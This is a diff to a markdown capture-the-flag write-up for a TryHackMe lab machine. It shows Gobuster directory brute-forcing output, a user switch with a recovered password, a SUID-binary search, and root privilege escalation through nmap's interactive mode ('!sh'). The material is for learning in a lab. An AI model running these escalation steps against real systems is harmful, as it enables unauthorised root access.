@@ -108,18 +108,18 @@ We’ve got some nice information. So, I wonder “ where could be “ the offic
 To find it, I bruted force it with Gobuster.
 ---
 
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.128.16/
-[+] Threads:        10
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2020/06/20 03:34:32 Starting gobuster
-===============================================================
+Gobuster v3.0.1\
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\
+===============================================================\
+[+] Url:            http://10.10.128.16/ \
+[+] Threads:        10\
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\
+[+] Status codes:   200,204,301,302,307,401,403\
+[+] User Agent:     gobuster/3.0.1\
+[+] Timeout:        10s\
+===============================================================\
+2020/06/20 03:34:32 Starting gobuster\
+===============================================================\
 /images (Status: 301)
 /blog (Status: 301)
 /sitemap (Status: 200)
@@ -274,37 +274,38 @@ On the TryHackMe website the hint was “nmap”
 
 So i found this website https://pentestlab.blog/category/privilege-escalation/ and it worked ! :D
 
-daemon@linux:/home/robot$ su robot
-su robot
-Password: abcdefghijklmnopqrstuvwxyz
+daemon@linux:/home/robot$ su robot\
+su robot\
+Password: abcdefghijklmnopqrstuvwxyz\
 
 ### To find the root process 
-find / -perm +6000 2>/dev/null | grep '/bin/'
-/bin/ping
-/bin/umount
-/bin/mount
-/bin/ping6
-/bin/su
-/usr/bin/mail-touchlock
-/usr/bin/passwd
-/usr/bin/newgrp
-/usr/bin/screen
-/usr/bin/mail-unlock
-/usr/bin/mail-lock
-/usr/bin/chsh
-/usr/bin/crontab
-/usr/bin/chfn
-/usr/bin/chage
-/usr/bin/gpasswd
-/usr/bin/expiry
-/usr/bin/dotlockfile
-/usr/bin/sudo
-/usr/bin/ssh-agent
-/usr/bin/wall
-/usr/local/bin/nmaprobot@linux:/$ nmap --interactive
-
+find / -perm +6000 2>/dev/null | grep '/bin/'*\
+/bin/ping  \
+/bin/umount\
+/bin/mount\
+/bin/ping6\
+/bin/su\
+/usr/bin/mail-touchlock\
+/usr/bin/passwd\
+/usr/bin/newgrp\
+/usr/bin/screen\
+/usr/bin/mail-unlock\
+/usr/bin/mail-lock\
+/usr/bin/chsh\
+/usr/bin/crontab\
+/usr/bin/chfn\
+/usr/bin/chage\
+/usr/bin/gpasswd\
+/usr/bin/expiry\
+/usr/bin/dotlockfile\
+/usr/bin/sudo\
+/usr/bin/ssh-agent\
+/usr/bin/wall\
+/usr/local/bin/nmaprobot@linux:/$ nmap --interactive\
+*
 + nmap --interactive## After some investigation on forum I found there is a weakness in Nmap, which you can be setting up into interactive mode. That allows to run shell commands inside of nmap.Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
 Welcome to Interactive Mode -- press h <enter> for help
+
 ```
 nmap> !sh
 !sh
